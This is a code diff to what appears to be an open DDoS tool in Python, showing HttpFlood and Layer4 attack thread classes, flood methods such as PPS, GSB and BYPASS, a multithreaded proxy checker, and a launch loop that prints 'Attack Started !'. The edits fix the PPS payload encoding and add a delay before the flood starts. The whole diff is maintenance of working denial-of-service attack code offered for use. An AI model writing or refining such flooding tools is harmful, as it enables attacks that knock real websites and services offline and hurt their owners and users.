@@ -241,7 +241,7 @@ class Layer4(Thread):
 class HttpFlood(Thread):
     _proxies: cycle = None
     _payload: str
-    _defaultpayload: str
+    _defaultpayload: Any
     _req_type: str
     _useragents: List[str]
     _referers: List[str]
@@ -514,7 +514,9 @@ class HttpFlood(Thread):
         if name == "GSB": self.SENT_FLOOD = self.GSB
         if name == "NULL": self.SENT_FLOOD = self.NULL
         if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
-        if name == "PPS": self.SENT_FLOOD = self.PPS
+        if name == "PPS":
+            self.SENT_FLOOD = self.PPS
+            self._defaultpayload = (self._defaultpayload + "\r\n").encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
 
     def BYPASS(self):
@@ -568,7 +570,9 @@ class ProxyManager:
     @staticmethod
     def checkAll(proxie: Set[Proxy], url: str = "http://google.com", timeout: int = 1, threads=100) -> Set[Proxy]:
         with ProxyManager.poolcontext(min(len(proxie) // cpu_count(), threads)) as pool:
-            return {pro[1] for pro in pool.map(partial(ProxyManager.checkProxy, url=url, timeout=timeout), proxie) if pro[0]}
+            return {pro[1] for pro in pool.map(partial(ProxyManager.checkProxy, url=url, timeout=timeout), proxie) if
+                    pro[0]}
+
 
 class ToolsConsole:
     METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
@@ -885,6 +889,7 @@ if __name__ == '__main__':
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event).start()
 
+                sleep(5)
                 print("Attack Started !")
                 event.set()
                 while timer:
